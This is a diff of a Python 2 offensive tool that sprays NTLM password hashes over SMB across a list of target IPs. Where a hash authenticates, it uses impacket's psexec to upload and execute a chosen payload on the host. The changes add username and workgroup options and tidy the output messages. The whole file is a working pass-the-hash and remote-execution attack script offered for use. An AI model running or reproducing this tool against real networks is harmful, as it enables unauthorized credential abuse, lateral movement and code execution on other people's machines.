@@ -1,6 +1,5 @@
 #!/usr/bin/python
 import psexec
-import smbclient
 import time
 import blessings
 import sys
@@ -13,7 +12,9 @@ t = blessings.Terminal()
 parser = argparse.ArgumentParser(description='Spray Smb Hashes and Psexec')
 parser.add_argument("-hashfile", help="Parse Hashes from a File (Hashes Seperated by New Line)")
 parser.add_argument("-ipfile", help="Parse IP's from a File (IP's Seperated by New Line)")
-parser.add_argument("payload", help="Select Payload for Psexec")
+parser.add_argument("-username", help="Set Username")
+parser.add_argument("-workgroup", help="Set WorkGroup")
+parser.add_argument("payloadpath", help="Select Payload for Psexec")
 args = parser.parse_args()
 
 hashfile = False
@@ -24,7 +25,7 @@ targetpassword = None
 workinghashes = []
 command = ''
 path = ''
-exeFile = args.payload
+exeFile = args.payloadpath
 copyFile = ''
 
 print t.bold_green + "[*] Chosen Payload: " + t.normal + exeFile
@@ -48,8 +49,14 @@ else:
     for ip in file:
         targetipseperated.append(ip.strip("\n"))
 
-targetusername = raw_input("[*] Enter Username: ")
-targetdomain = raw_input("[*] Enter Domain: ")
+if not args.username:
+    targetusername = raw_input("[*] Enter Username: ")
+else:
+    targetusername = args.username
+if not args.workgroup:
+    targetdomain = raw_input("[*] Enter Domain: ")
+else:
+    targetdomain = args.workgroup
 
 for ip in targetipseperated:
     for hash in targetsprayhash:
@@ -59,7 +66,7 @@ for ip in targetipseperated:
             smb = SMBConnection(ip, ip, sess_port=445,timeout=5)
             smb.setTimeout(5)
         except:
-            print t.bold_red + "[!!]SMB Port not Open or Timed Out!!" +t.normal
+            print t.bold_red + "[!!] SMB Port not Open or Timed Out!!" +t.normal
             continue
         try:
             smb.setTimeout(5)
@@ -84,10 +91,11 @@ if want_to_psexec.lower() == "y" or want_to_psexec == "":
         psexechash,psexecip = hash.split(',')
         PSEXEC = psexec.PSEXEC(command, path, exeFile, copyFile, protocols=None, username=targetusername,
                                hashes=psexechash, domain=targetdomain, password=targetpassword, aesKey=None, doKerberos=False)
-        print t.bold_green + '\n [*] Starting Psexec....' + t.normal
+        print t.bold_green + '\n[*] Starting Psexec....' + t.normal
         try:
             PSEXEC.run(psexecip)
         except SessionError:
             print t.bold_red + "[*] Failed to Remove Payload, Remove Manually with Shell"
 else:
+    print t.bold_green + "[*] Done." + t.normal
     sys.exit(0)
